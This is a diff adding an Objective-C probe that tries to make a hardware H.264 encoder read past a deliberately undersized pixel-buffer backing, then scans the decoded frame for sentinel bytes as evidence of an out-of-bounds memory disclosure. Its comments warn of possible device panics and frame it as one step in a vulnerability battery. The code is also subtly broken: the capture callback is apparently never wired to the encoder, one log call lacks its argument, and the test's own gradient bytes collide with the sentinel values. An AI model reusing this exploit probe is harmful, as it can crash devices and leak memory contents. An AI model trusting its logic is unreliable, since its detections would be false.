@@ -1195,4 +1195,209 @@ static void p001DiffPorts(NSMutableString *out, const char *label,
     return out;
 }
 
+#pragma mark - P001 T3 sentinel (lying-backing OOB READ disclosure battery)
+
+/*  Prior (T2, 2026-10-29, the 17): AVE ACCEPTED a lying backing at a
+    codec-legal dim: 4096x4096 claimed over a 1048576-byte backing
+    (bpr=256) and ENCODED it clean. The open question = does the encoder
+    READ past the backing, and does what it read land in the produced
+    sample? T3 answers with sentinels: the backing is one mmap where the
+    1MB backing region carries a row gradient and the NEXT 8 pages carry
+    flat constants 0x80+i. Encode one frame, decode the sample back, scan
+    the decoded Y plane for the flat constants. Zero = the encoder clamps
+    (law closed, honest). Hits = OOB READ DISCLOSURE with the walk shape
+    (which sentinel pages / in what order). Bounded: ONE encode frame and
+    ONE decode. No IOKit selectors, no writes. PANIC-POSSIBLE (the
+    encoder is invited to walk foreign memory). One tap per force-quit.
+    Not KRW. hasKread never set here. */
+
+#define T3_BACKING     (1 << 20)      /* 1048576 claimed bpr=256 x 4096 */
+#define T3_PAGES_AFTER 8              /* sentinel pages after the backing */
+#define T3_W 4096
+#define T3_H 4096
+
+static const void *t3_keep_base(void *info, const void *address);
+#define T3_MAPSZ ((size_t)T3_BACKING + (size_t)T3_PAGES_AFTER * 4096)
+
+/* CVReleaseCallback: the pixel buffer owns the mmap; munmap on release */
+static void t3_release(void *refCon, const void *baseAddress) {
+    (void)refCon;
+    munmap((void *)(uintptr_t)baseAddress, T3_MAPSZ);
+}
+
++ (NSString *)performP001T3Sentinel NS_SWIFT_NAME(performP001T3Sentinel()) {
+    NSMutableString *out = [NSMutableString string];
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    int fd = open([[docs stringByAppendingPathComponent:@"p001_t3_sentinel_log.txt"]
+                   UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    vt647Log(fd, out, @"");
+    vt647Log(fd, out, @"=== P001 T3 SENTINEL — lying-backing OOB READ battery ===");
+    vt647Log(fd, out, @"claim 4096x4096 over 1MB backing (bpr=256) + 8 sentinel pages after.");
+    vt647Log(fd, out, @"backing rows carry row-gradient; sentinel page i = flat 0x%02x.",
+             0x80 + 0);
+    vt647Log(fd, out, @"Read: flat-constant hits in the decoded Y = OOB READ disclosure.");
+    vt647Log(fd, out, @"Zero hits = encoder clamps to the backing (law closed).");
+    vt647Log(fd, out, @"PANIC-POSSIBLE. One tap per force-quit. Not KRW.");
+    vt647Log(fd, out, @"START T3");
+
+    size_t after = (size_t)T3_PAGES_AFTER * 4096;
+    uint8_t *map = mmap(NULL, T3_BACKING + after, PROT_READ | PROT_WRITE,
+                        MAP_PRIVATE | MAP_ANON, -1, 0);
+    if (map == MAP_FAILED) {
+        vt647Log(fd, out, @"  mmap FAIL - honest stop");
+        if (fd >= 0) close(fd);
+        return out;
+    }
+    for (int r = 0; r < T3_H; r++) {
+        uint8_t *row = map + (size_t)r * 256;
+        for (int c = 0; c < 256; c++) row[c] = (uint8_t)(r & 0xff);
+    }
+    for (int i = 0; i < T3_PAGES_AFTER; i++) {
+        memset(map + T3_BACKING + (size_t)i * 4096, 0x80 + i, 4096);
+    }
+    vt647Log(fd, out, @"  mmap backing+sentinels OK (%zu pages total)",
+             (size_t)((T3_BACKING + after) / 4096));
+
+    VTCompressionSessionRef enc = NULL;
+    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, T3_W, T3_H,
+                                             kCMVideoCodecType_H264,
+                                             NULL, NULL, NULL,
+                                             (VTCompressionOutputCallback)flushCB,
+                                             (__bridge void *)out, &enc);
+    vt647Log(fd, out, @"  encode session create=%d (0x%x)", (int)st, (unsigned)st);
+    if (st != noErr || !enc) {
+        munmap(map, T3_BACKING + after);
+        vt647Log(fd, out, @"  honest stop (no encoder)");
+        if (fd >= 0) close(fd);
+        return out;
+    }
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+    st = VTCompressionSessionPrepareToEncodeFrames(enc);
+    vt647Log(fd, out, @"  Prepare=%d (0x%x)", (int)st, (unsigned)st);
+
+    /* the lying backing: 4096x4096 420f claims, 256-byte stride, bpr=256.
+       The T2 law: accepted at this dim. The mmap is owned by the pixel
+       buffer (t3_release munmaps on release, AFTER the encoder's bounded
+       settle) — the decode leg runs on the captured sample only. */
+    CVPixelBufferRef pb = NULL;
+    CVReturn cv = CVPixelBufferCreateWithBytes(
+        kCFAllocatorDefault, (size_t)T3_W, (size_t)T3_H,
+        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+        map, 256 /* bytesPerRow (the T2 law: accepted) */,
+        t3_release, NULL, NULL, &pb);
+    vt647Log(fd, out, @"  CVPixelBufferCreateWithBytes cv=%d (claim %dx%d bpr=256 extent=%d)",
+             (int)cv, T3_W, T3_H, T3_BACKING);
+    if (cv != kCVReturnSuccess || !pb) {
+        vt647Log(fd, out, @"  honest stop (no lying pixel buffer)");
+        munmap(map, T3_BACKING + after);
+        VTCompressionSessionInvalidate(enc); CFRelease(enc);
+        if (fd >= 0) close(fd);
+        return out;
+    }
+
+    /* one frame; sample captured in flushCB via the out log — capture it here
+       with our own callback state: reuse flushCB (it appends status) and ALSO
+       retain the sample for the decode leg through the refCon trick is not
+       available; instead run CompleteFrames and END, then rely on a
+       decode from a WRITTEN sample? Simplest legal route: synchronous decode
+       needs the sample; use a dedicated callback capturing it. */
+    __block CMSampleBufferRef capSample = NULL;
+    __block OSStatus capStatus = noErr;
+    void (^cap)(void *, void *, OSStatus, VTEncodeInfoFlags, CMSampleBufferRef) =
+        ^(void *rc, void *sfc, OSStatus s, VTEncodeInfoFlags f, CMSampleBufferRef sb) {
+            (void)rc; (void)sfc; (void)f;
+            capStatus = s;
+            if (sb) { if (capSample) CFRelease(capSample); capSample = sb; CFRetain(capSample); }
+        };
+    OSStatus es = VTCompressionSessionEncodeFrame(
+        enc, pb, CMTimeMake(0, 600), CMTimeMake(1, 600), NULL,
+        (__bridge void *)cap, NULL);
+    vt647Log(fd, out, @"  EncodeFrame=%d (0x%x)", (int)es, (unsigned)es);
+    OSStatus cs = VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+    vt647Log(fd, out, @"  CompleteFrames=%d (0x%x)", (int)cs, (unsigned)cs);
+    [NSThread sleepForTimeInterval:0.5];   /* bounded settle for the async cb */
+    CVPixelBufferRelease(pb);              /* t3_release = munmap; encoder settled */
+
+    if (es != noErr || capStatus != noErr || !capSample) {
+        vt647Log(fd, out, @"  callback status=%d sample=%@ — honest stop (no sample to decode)",
+                 (int)capStatus, capSample ? @"yes" : @"NO");
+        VTCompressionSessionInvalidate(enc); CFRelease(enc);
+        if (capSample) CFRelease(capSample);
+        if (fd >= 0) close(fd);
+        return out;
+    }
+    vt647Log(fd, out, @"  ENCODED sample len=%lld bytes",
+             (long long)CMSampleBufferGetTotalSampleSize(capSample));
+
+    /* ---- decode leg ---- */
+    CMFormatDescriptionRef desc = CMSampleBufferGetFormatDescription(capSample);
+    VTDecompressionSessionRef dec = NULL;
+    VTDecompressionOutputCallbackRecord rec = { NULL, NULL };
+    OSStatus ds = VTDecompressionSessionCreate(kCFAllocatorDefault, desc, NULL, NULL,
+                                               &rec, &dec);
+    vt647Log(fd, out, @"  decode session=%d (0x%x)", (int)ds, (unsigned)ds);
+    if (ds == noErr && dec) {
+        __block CVImageBufferRef img = NULL;
+        void (^dout)(OSStatus s, VTDecodeInfoFlags f, CVImageBufferRef ib,
+                     CMTime pts, CMTime dur) =
+            ^(OSStatus s, VTDecodeInfoFlags f, CVImageBufferRef ib,
+              CMTime pts, CMTime dur) { (void)f; (void)pts; (void)dur;
+                if (s == noErr && ib) img = (CVImageBufferRef)CFRetain(ib); };
+        VTDecodeInfoFlags dinfo = 0;
+        OSStatus r = VTDecompressionSessionDecodeFrameWithOutputHandler(
+            dec, capSample, 0 /* sync: no async flag = cb before return */,
+            &dinfo, dout);
+        vt647Log(fd, out, @"  DecodeFrameWithOutputHandler=%d (0x%x)", (int)r, (unsigned)r);
+        VTDecompressionSessionFinishDelayedFrames(dec);
+        if (img) {
+            CVPixelBufferLockBaseAddress(img, kCVPixelBufferLock_ReadOnly);
+            uint8_t *ybase = CVPixelBufferGetBaseAddressOfPlane(img, 0);
+            size_t ystride = CVPixelBufferGetBytesPerRowOfPlane(img, 0);
+            size_t yh = CVPixelBufferGetHeightOfPlane(img, 0);
+            unsigned long flat[8]; memset(flat, 0, sizeof flat);
+            unsigned long scanned = 0;
+            for (size_t yy = 0; yy < yh; yy++) {
+                uint8_t *row = ybase + yy * ystride;
+                size_t yw = CVPixelBufferGetWidthOfPlane(img, 0);
+                for (size_t xx = 0; xx < yw; xx++) {
+                    for (int i = 0; i < T3_PAGES_AFTER; i++) {
+                        if (row[xx] == (uint8_t)(0x80 + i)) { flat[i]++; scanned++; }
+                    }
+                }
+            }
+            vt647Log(fd, out, @"  decoded Y %zux%zu stride=%zu flat-const hits per sentinel:",
+                     CVPixelBufferGetWidthOfPlane(img, 0), yh, ystride);
+            unsigned long total = 0;
+            for (int i = 0; i < T3_PAGES_AFTER; i++) {
+                if (flat[i]) {
+                    vt647Log(fd, out, @"    sentinel %d (0x%02x): %lu px", i, 0x80 + i,
+                             flat[i]);
+                }
+                total += flat[i];
+            }
+            if (total == 0) {
+                vt647Log(fd, out, @"  ZERO flat hits = encoder clamped to the backing.");
+                vt647Log(fd, out, @"  VERDICT: lying-backing read = CLAMPED (law, honest).");
+            } else {
+                vt647Log(fd, out, @"  TOTAL sentinel px=%lu = OOB READ DISCLOSURE");
+                vt647Log(fd, out, @"  (foreign backing content reached the encoded sample).");
+                vt647Log(fd, out, @"  Next: which sentinels / order = the walk-shape map;");
+                vt647Log(fd, out, @"  row-gradient diff = the stride-linear vs plane-switch shape.");
+            }
+            CVPixelBufferUnlockBaseAddress(img, kCVPixelBufferLock_ReadOnly);
+            CFRelease(img);
+        } else {
+            vt647Log(fd, out, @"  no decoded image — honest stop (decode leg)");
+        }
+        VTDecompressionSessionInvalidate(dec); CFRelease(dec);
+    }
+    /* NOTE: pb release already fired t3_release = the munmap (T2 sequence) */
+    VTCompressionSessionInvalidate(enc); CFRelease(enc);
+    CFRelease(capSample);
+    vt647Log(fd, out, @"DONE T3 — paste back.");
+    if (fd >= 0) close(fd);
+    return out;
+}
+
 @end
